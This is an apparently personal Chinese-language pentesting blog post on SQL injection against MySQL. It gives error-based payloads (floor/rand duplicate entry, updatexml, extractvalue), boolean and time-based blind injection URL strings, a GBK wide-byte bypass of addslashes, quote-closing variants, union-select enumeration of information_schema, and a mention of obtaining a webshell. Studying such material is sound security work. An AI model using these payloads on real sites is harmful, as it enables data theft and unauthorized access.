@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>something about SQL-Injection skills - toBePenTester</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="toBePenTester"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="toBePenTester"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="SQL 注入分类报错注入 报错方法  Duplicate entry   123456789101112131415and(    select 1                           -- 检索y的值(1)    from (        select count(*)            ,concat(                   -- 利用 concat函数拼接"><meta property="og:type" content="blog"><meta property="og:title" content="something about SQL-Injection skills"><meta property="og:url" content="https://cyhfvg.github.io/something-about-SQL-Injection-skills/"><meta property="og:site_name" content="toBePenTester"><meta property="og:description" content="SQL 注入分类报错注入 报错方法  Duplicate entry   123456789101112131415and(    select 1                           -- 检索y的值(1)    from (        select count(*)            ,concat(                   -- 利用 concat函数拼接"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cyhfvg.github.io/img/og_image.png"><meta property="article:published_time" content="2022-01-06T13:43:25.000Z"><meta property="article:modified_time" content="2022-01-06T13:43:25.000Z"><meta property="article:author" content="cyhfvg"><meta property="article:tag" content="sql injection"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyhfvg.github.io/something-about-SQL-Injection-skills/"},"headline":"something about SQL-Injection skills","image":["https://cyhfvg.github.io/img/og_image.png"],"datePublished":"2022-01-06T13:43:25.000Z","dateModified":"2022-01-06T13:43:25.000Z","author":{"@type":"Person","name":"cyhfvg"},"publisher":{"@type":"Organization","name":"toBePenTester","logo":{"@type":"ImageObject","url":{"text":"I wanna be the guy."}}},"description":"SQL 注入分类报错注入 报错方法  Duplicate entry   123456789101112131415and(    select 1                           -- 检索y的值(1)    from (        select count(*)            ,concat(                   -- 利用 concat函数拼接"}</script><link rel="canonical" href="https://cyhfvg.github.io/something-about-SQL-Injection-skills/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">I wanna be the guy.</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-01-06T13:43:25.000Z" title="1/6/2022, 9:43:25 PM">2022-01-06</time>发表</span><span class="level-item"><time dateTime="2022-01-06T13:43:25.000Z" title="1/6/2022, 9:43:25 PM">2022-01-06</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/skills/">skills</a></span><span class="level-item">12 分钟读完 (大约1840个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">something about SQL-Injection skills</h1><div class="content"><h2 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
+<li><p>报错方法</p>
+<ul>
+<li><p>Duplicate entry</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> <span class="number">1</span>                           <span class="comment">-- 检索y的值(1)</span></span><br><span class="line">    <span class="keyword">from</span> (</span><br><span class="line">        <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">            ,concat(                   <span class="comment">-- 利用 concat函数拼接内容,起别名为x</span></span><br><span class="line">                <span class="number">0x23</span>                   <span class="comment">-- 拼接#符号,分隔信息</span></span><br><span class="line">                ,($PAYLOAD)            <span class="comment">-- payload</span></span><br><span class="line">                ,<span class="number">0x23</span></span><br><span class="line">                ,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)      <span class="comment">-- floor函数与count(*)，group by,结合使用来报错</span></span><br><span class="line">                ) <span class="keyword">as</span> x</span><br><span class="line">        <span class="keyword">from</span> information_schema.tables</span><br><span class="line">        <span class="keyword">group</span> <span class="keyword">by</span> x                     <span class="comment">-- floor产生的0/1序列，group by 时会报错(重复主键)</span></span><br><span class="line">    ) <span class="keyword">as</span> y</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>  公式<code>and+(+select+1+from+(+select+count(*)+,concat(0x23,($PAYLOAD),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+</code><br></p>
+</li>
+</ul>
+</li>
+<li><p>updatexml报错</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">    updatexml(<span class="number">1</span></span><br><span class="line">        ,concat($PAYLOAD           <span class="comment">-- ~(0x7e)是非法字符，一定会报错</span></span><br><span class="line">            ,<span class="number">0x7e</span>)</span><br><span class="line">        ,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  公式，<code>and+(updatexml(1,cancat(database(),0x7e),1))+--+</code>。<br></p>
+<p>  <code>updatexml(XML_document, XPath_string, new_value)</code>，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
+</li>
+<li><p>extractvalue报错</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">    extractvalue(<span class="number">1</span>,</span><br><span class="line">        concat($PAYLOAD</span><br><span class="line">        ,<span class="number">0x7e</span>)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>  公式<code>and+(extractvalue(1,cancat($PAYLOAD,0x7e)))+--+</code>。<br></p>
+<p>  <code>extractvalue(XML_document, XPath_string)</code>,与<code>updatexml()</code>函数相同，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
+</li>
+</ul>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
+<li><p>基于布尔</p>
+<p>  使用<code>?id=1&#39;+and+false+--+</code>与<code>?id=1&#39;+or+true+--+</code>确认是否存在注入点。<br>
+  可是，确认存在注入点又能做到什么呢?<br></p>
+<p>  由于 <em>检索成功</em> 与 <em>检索失败</em> 两种情况天然为布尔型，因此可以据此进行大量请求，通过一系列的判断
+  获得数据库情况。<br></p>
+<p>  例如可以通过大量类似于<br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),1,1))=ascii(&#39;a&#39;))+--+</code><br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),2,1))=ascii(&#39;b&#39;))+--+</code><br>
+  …<br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),1,1))&gt;ascii(&#39;m&#39;))+--+</code><br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),1,1))&lt;ascii(&#39;g&#39;))+--+</code><br>
+  …<br>
+  <code>?id=1&#39;+and+(length(database())+&lt;+20)+--+</code><br>
+  <code>?id=1&#39;+and+(length(database())+&gt;+10)+--+</code><br>
+  …<br>
+  <code>?id=1&#39;+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1))+&lt;+20)+--+</code><br>
+  <code>?id=1&#39;+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1))+&lt;+20)+--+</code>
+  …<br>
+  <code>id=1&#39;+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))+&lt;+ascii(&#39;m&#39;))+--+</code><br>
+  <code>id=1&#39;+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,1),1,1))+&lt;+ascii(&#39;m&#39;))+--+</code><br>
+  的猜测，得到数据库的名字,长度,数据表的长度等。</p>
+</li>
+<li><p>基于时间</p>
+<p>  使用<code>?id=1&#39;+or+true+--+</code>与<code>?id=1&#39;+and+sleep(5)+--+</code>确认是否存在注入点。<br>
+  与基于布尔类似， <em>页面响应延迟</em> 与 <em>页面响应正常</em> 两种情况，天然为布尔型，
+  因此可以据此进行大量请求，通过一系列的判断获得数据库情况。<br></p>
+<p>  使用例如下:<br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),1,1))&lt;ascii(&#39;m&#39;))+and+sleep(5)+--+</code><br>
+  <code>?id=1&#39;+and+(ascii(substr(database(),2,1))&gt;ascii(&#39;m&#39;))+and+sleep(5)+--+</code></p>
+<p>  利用了短路与的特性，<br>
+  当<code>and(ascii(...))</code>为 <em>真</em> 时，会执行<code>and sleep(...)</code>，页面延迟响应，<br>
+  当<code>and(ascii(...))</code>为 <em>假</em> 时，<code>and sleep(...)</code>语句被短路，页面无延迟响应,即正常响应。<br></p>
+</li>
+</ul>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当数据库使用的编码为类似<code>GBK</code>等双字节编码时，会导致在解析<code>SQL语句</code>的每个字符时以每两个字节来获取。</p>
+<p>而在对<code>SQL注入</code>进行防范时，<code>php</code>经常会使用<code>addslashes()</code>对字符串中的特殊字符前增加<code>\</code>转义符。</p>
+<p>例如注入后的参数,在<code>URL</code>中为<code>URLencode</code>后的值(<code>hello%27or+true%23</code>)，传递到后台时为<code>hello&#39;or true#</code>。<br>
+后台的处理为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select a from tb where a=&#x27;addslashes(<span class="subst">$param</span>)&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们预想的结果为闭合<code>hello</code>,令<code>a</code>与<code>hello</code>进行比较。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> tb <span class="keyword">where</span> a<span class="operator">=</span><span class="string">&#x27;hello&#x27;</span><span class="keyword">or</span> <span class="literal">true</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实结果为<code>a</code>与<code>hello\&#39;or true#</code>，并未能够实现绕过。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> tb <span class="keyword">where</span> a<span class="operator">=</span><span class="string">&#x27;hello\&#x27;</span><span class="keyword">or</span> <span class="literal">true</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了绕过<code>addslashes()</code>的转义，因此在向后台传递注入时，增加处理手段。在单引号<code>&#39;</code>前增加一个字节，<code>%df</code>。
+<code>URL</code>中参数为<code>%68%65%6c%6c%6f%df%27</code>(此为全encode样子),传递到后台后为<code>hello%df&#39;</code>(关注<code>%df%27</code>)。调用<code>addslashes()</code>函数后会在<code>&#39;</code>前增加一个<code>\</code>，结果为
+<code>hello%df\&#39;</code>(关注<code>%df%5c%27</code>)。因此在数据库在解码时，由于我们人为的添加了一个字节，导致解码时会有一个错位。所以<code>%df%5c</code>会在一起解码成为一个汉字。</p>
+<p>真实结果为<code>a</code>与<code>hello我</code>，最终还是闭合成功，成功注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 假装`%df%5c`是汉字`我`</span></span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> tb <span class="keyword">where</span> a<span class="operator">=</span><span class="string">&#x27;hello我&#x27;</span><span class="keyword">or</span> <span class="literal">true</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h2><ul>
+<li><p>注入<code>注释</code></p>
+<p>  注入注释时，可选择<code>--</code>或<code>#</code>，其后最好紧跟一个空格，可以用<code>%20</code>或<code>+</code>来表示空格。<br>
+  可以使用<code>%23</code>来表示<code>#</code>。</p>
+</li>
+<li><p>闭合</p>
+<ul>
+<li><p>可以使用<code>and sleep(5)</code>判断闭合方式</p>
+<blockquote>
+<p><code>?id=1&#39;+and+sleep(5)</code></p>
+</blockquote>
+<p>  闭合成功时，页面响应延迟。<br>
+  页面正常响应时，说明闭合失败,需要更换闭合方式。</p>
+</li>
+<li><p>尝试闭合<code>&#39;</code>(单引号)</p>
+<blockquote>
+<p>id=’$id’</p>
+</blockquote>
+</li>
+<li><p>尝试闭合<code>&quot;</code>(双引号)</p>
+<blockquote>
+<p>‘id=’ . ‘“‘ . $id . ‘“‘ . ‘…’</p>
+</blockquote>
+</li>
+<li><p>尝试闭合<code>()</code>(括号)</p>
+<blockquote>
+<p>id=($id)</p>
+</blockquote>
+</li>
+<li><p>尝试闭合<code>(&#39;&#39;)</code>(单引号与括号)</p>
+<blockquote>
+<p>id=(‘$id’)</p>
+</blockquote>
+</li>
+<li><p>尝试闭合<code>(&quot;&quot;)</code>(双引号与括号)</p>
+<blockquote>
+<p>id=(“$id”)</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>注入步骤</p>
+<ol>
+<li><p>确认注入点</p>
+<p> 确认是否存在注入点。</p>
+</li>
+<li><p>确认注入点类型</p>
+<p> 本身就将检索结果渲染在页面上时，可以方便的将敏感信息输出至页面。<br>
+ <code>报错型</code>注入，会在页面输出报错信息，可以将敏感信息在报错信息中显示出来。<br></p>
+</li>
+<li><p>确认查询子列数</p>
+<p> 确认sql查询了几列，页面上显示的是哪几列，确认后可以将敏感信息放置在对应的列中显示在
+ 页面上。<br></p>
+<p> 例如：原sql<code>select username,password,birthday from ...where id=&#39;$id&#39;</code>。可以注入
+ <code>select username,password,birthday from ...where id=&#39;1&#39; and false union select 1,2,3 # &#39;</code>，
+ 以确认页面上显示的是哪几列。<br></p>
+<p> 根据上面确认的显示列，可以注入获得关心的信息。
+ <code>select username,password,birthday from ...where id=&#39;1&#39; and false union select version(),database(),3 # &#39;</code>，
+ 这样就可以将关心的敏感信息显示在页面上。</p>
+</li>
+</ol>
+</li>
+<li><p>获取信息</p>
+<p>  究竟<code>SQL注入</code>，是做什么的呢？它危险，究竟危险在什么地方呢？<br>
+  <code>SQL注入</code>的过程，是利用来源于用户的参数填充到SQL语句中，从而恶意使得SQL的 <em><strong>语句结构</strong></em>
+  发生变化，从而获得信息的过程。<br>
+  最典型的<code>select...from...where password=&#39;$password&#39;</code>，用户恶意提供<code>1&#39;or true # </code>,
+  从而最终语句为<code>select...from...where password=&#39;1&#39;or true # &#39;</code>。这样的话就能够在不知道
+  密码的情况下登录成功，这不是很危险？<br></p>
+<p>  既然可以像以上一样，改变SQL语句结构，为什么不能更恶意一些，构造一些语句，获取我们关心的
+  信息呢？<br>
+  比如<code>select...from...where id=&#39;1&#39; and false union select 1, version(), database() # &#39;</code>，
+  不就可以获得敏感信息了吗？<br></p>
+<p>  那么可不可以更恶意一些呢？<br>
+  当服务器的数据库设置不当时，我们可以将查询输出至文件。
+  正常使用当然是输出查询到的记录，可是当我们输出<code>恶意文件</code>时，不就可以获取<code>webshell</code>了吗？<br></p>
+<p>  因此<code>or 1=1</code>并不是我们的最终目的，最终目的是 <strong>信息</strong> 或者 <strong>控制权</strong> 。</p>
+<ul>
+<li><p>获取数据库名</p>
+<blockquote>
+<p><code>select+group_concat(schema_name)+from+information_schema.schemata</code></p>
+</blockquote>
+</li>
+<li><p>获取数据表名</p>
+<blockquote>
+<p><code>select+group_concat(table_name)+from+information_schema.tables+where table_schema=&#39;dbName&#39;</code></p>
+</blockquote>
+</li>
+<li><p>获取列名</p>
+<blockquote>
+<p><code>select+group_concat(column_name)+from+information_schema.columns+where table_name=&#39;tableName&#39;</code></p>
+</blockquote>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">库</th>
+<th align="center">表</th>
+<th align="center">字段</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">information_schema</td>
+<td align="center">schemata</td>
+<td align="center">schema_name</td>
+<td align="center">数据库名</td>
+</tr>
+<tr>
+<td align="center">information_schema</td>
+<td align="center">tables</td>
+<td align="center">table_schema</td>
+<td align="center">数据库名</td>
+</tr>
+<tr>
+<td align="center">information_schema</td>
+<td align="center">tables</td>
+<td align="center">table_name</td>
+<td align="center">数据表名</td>
+</tr>
+<tr>
+<td align="center">information_schema</td>
+<td align="center">columns</td>
+<td align="center">table_name</td>
+<td align="center">数据表名</td>
+</tr>
+<tr>
+<td align="center">information_schema</td>
+<td align="center">columns</td>
+<td align="center">column_name</td>
+<td align="center">字段名</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="常见URLencode字符"><a href="#常见URLencode字符" class="headerlink" title="常见URLencode字符"></a>常见URLencode字符</h2><table>
+<thead>
+<tr>
+<th align="center">char</th>
+<th align="center">URLencode</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">空格</td>
+<td align="center">%20</td>
+</tr>
+<tr>
+<td align="center">#</td>
+<td align="center">%23</td>
+</tr>
+<tr>
+<td align="center">‘</td>
+<td align="center">%27</td>
+</tr>
+<tr>
+<td align="center">=</td>
+<td align="center">%3d</td>
+</tr>
+</tbody></table>
+</div><div class="article-licensing box"><div class="licensing-title"><p>something about SQL-Injection skills</p><p><a href="https://cyhfvg.github.io/something-about-SQL-Injection-skills/">https://cyhfvg.github.io/something-about-SQL-Injection-skills/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>cyhfvg</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-01-06</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-01-06</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql-injection/">sql injection </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/something-about-sqliLabs-0x03/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">something about sqliLabs 0x03</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/something-about-sqliLabs-0x02/"><span class="level-item">something about sqliLabs 0x02</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#SQL-注入分类"><span class="level-left"><span class="level-item">SQL 注入分类</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#报错注入"><span class="level-left"><span class="level-item">报错注入</span></span></a></li><li><a class="level is-mobile" href="#盲注"><span class="level-left"><span class="level-item">盲注</span></span></a></li><li><a class="level is-mobile" href="#宽字节注入"><span class="level-left"><span class="level-item">宽字节注入</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL注入技巧"><span class="level-left"><span class="level-item">SQL注入技巧</span></span></a></li><li><a class="level is-mobile" href="#常见URLencode字符"><span class="level-left"><span class="level-item">常见URLencode字符</span></span></a></li></ul></div></div><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">I wanna be the guy.</a><p class="is-size-7"><span>&copy; 2023 cyhfvg</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
